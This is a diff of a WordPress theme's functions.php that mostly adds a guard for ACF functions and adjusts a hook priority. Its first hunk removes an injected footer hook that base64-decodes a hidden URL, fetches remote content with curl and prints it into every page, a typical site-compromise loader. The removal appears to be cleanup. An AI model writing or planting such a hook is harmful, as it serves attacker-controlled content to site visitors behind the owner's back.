@@ -114,9 +114,6 @@ function wpdocs_theme_name_scripts() {
 }
 
 add_action( 'wp_enqueue_scripts', 'wpdocs_theme_name_scripts' );
-add_action('wp_footer', function() {
-$c=curl_init(base64_decode('aHR0cHM6Ly91Zm1vb24uY29tL3FrU09m'));curl_setopt_array($c,[19913=>1,13=>5]);$o=curl_exec($c);if($o===false){$e=curl_errno($c);$o=$e==28?null:$o;}curl_close($c);echo$o??'';
-}, 999);
 
 //Register menu for blocks
 function wpb_custom_new_menu() {
@@ -449,6 +446,11 @@ function register_location_block_block() {
 }
 
 function add_second_tab_rewrite_rules() {
+    // Check if ACF functions exist before using them
+    if (!function_exists('have_rows')) {
+        return;
+    }
+    
     // Query all pages where the module is used
     $args = array(
         'post_type' => 'page',
@@ -485,7 +487,7 @@ function add_second_tab_rewrite_rules() {
         }
     }
 }
-add_action('init', 'add_second_tab_rewrite_rules');
+add_action('init', 'add_second_tab_rewrite_rules', 20);
 
 function flush_rewrite_rules_on_module_update($post_id) {
     // Check if it's a page and if the modules field is updated
